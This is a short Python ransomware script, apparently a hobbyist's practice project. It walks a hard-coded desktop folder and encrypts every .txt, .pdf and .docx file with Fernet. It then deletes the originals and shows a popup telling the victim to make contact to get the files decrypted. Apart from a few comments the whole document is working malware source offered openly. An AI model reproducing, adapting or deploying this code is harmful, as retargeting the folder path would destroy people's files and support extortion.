import os, sys, time
from cryptography.fernet import Fernet
from tkinter import messagebox
import tkinter as tk

# Generate Encryption Key and save it to a file
key = Fernet.generate_key()
with open('Ransom.key', 'wb') as filekey:
    filekey.write(key)

# Function to Encrypt Files
def encrypt_file(file_path, key):
    fernet = Fernet(key)
    with open(file_path, 'rb') as file:
        file_data = file.read()
        encrypted_data = fernet.encrypt(file_data)
    with open(file_path + '.encrypted', 'wb') as encrypted_file:
        encrypted_file.write(encrypted_data)

# Ransom Message
def show_popup(message):
    root = tk.Tk()
    root.withdraw() 
    messagebox.showinfo("RANSOMWARE ALERT", message)
    root.mainloop()

# Folder location of where to encrypt the files.
directory_path = "/home/maxwell/Desktop/Happy Files"

# The Blacklisted portion helps to make sure I don't Encrypt anything that actually matters on the system. While the Allowed portion helps me see what files I am allowed to encrypt.
blacklisted = ['.dll', '.exe', '.sys', '.ini']
allowed = ['.txt', '.pdf', '.docx']

for root, dirs, files in os.walk(directory_path):
    for file in files:
        file_path = os.path.join(root, file)
        file_ext = os.path.splitext(file_path)[1].lower()

        if file_ext in allowed and file_ext:
            print(f"File '{file_path}' Encrypted.")
            encrypt_file(file_path, key)
            time.sleep(1)
            os.remove(file_path)
            print(f"Normal file '{file_path}' is no more.")

# Ransomware Popup
message_text = "RANSOMWARE ALERT! Your files have been encrypted. Contact us for instructions on how to decrypt them."
show_popup(message_text)
sys.exit()
